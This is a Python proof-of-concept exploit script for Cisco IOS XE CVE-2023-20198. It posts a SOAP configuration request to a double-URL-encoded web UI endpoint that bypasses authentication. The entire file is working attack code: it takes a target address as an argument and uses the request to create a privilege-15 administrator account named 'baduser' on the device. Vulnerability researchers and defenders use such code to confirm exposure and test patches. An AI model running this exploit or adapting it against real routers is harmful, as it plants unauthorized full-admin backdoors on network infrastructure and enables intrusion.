Cisco_IOS_CVE-2023-20198.py


#Cisco IOS XE CVE-2023-20198
#https://www.horizon3.ai/cisco-ios-xe-cve-2023-20198-deep-dive-and-poc/
#@w3bd3vil
import requests
import sys

soap_request = '''
<?xml version="1.0" encoding="UTF-8"?>
<SOAP:Envelope
  xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
  xmlns:xsd="http://www.w3.org/2001/XMLSchema"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <SOAP:Header>
    <wsse:Security
      xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext">
      <wsse:UsernameToken>
        <wsse:Username>YourUsername</wsse:Username>
        <wsse:Password
          Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText">
          YourPassword
        </wsse:Password>
      </wsse:UsernameToken>
    </wsse:Security>
  </SOAP:Header>
  <SOAP:Body>
   <request xmlns="urn:cisco:wsma-config" correlator="execl">
    <configApply details="all">
      <config-data>
      <cli-config-data-block>
        username baduser privilege 15 secret badpassword
        </cli-config-data-block>
      </config-data>
    </configApply>
    </request>
  </SOAP:Body>
</SOAP:Envelope>
'''
if len(sys.argv) > 1:
  url = 'http://'+sys.argv[1]+'/%2577ebui_wsma_http'
  headers = {
    'Content-Type': 'text/xml;charset=UTF-8',
}

  # Send the POST request
  response = requests.post(url, data=soap_request, headers=headers)

  print(response.status_code)
  print(response.text)
else:
    print("sys.argv[0] 127.0.0.1:80")

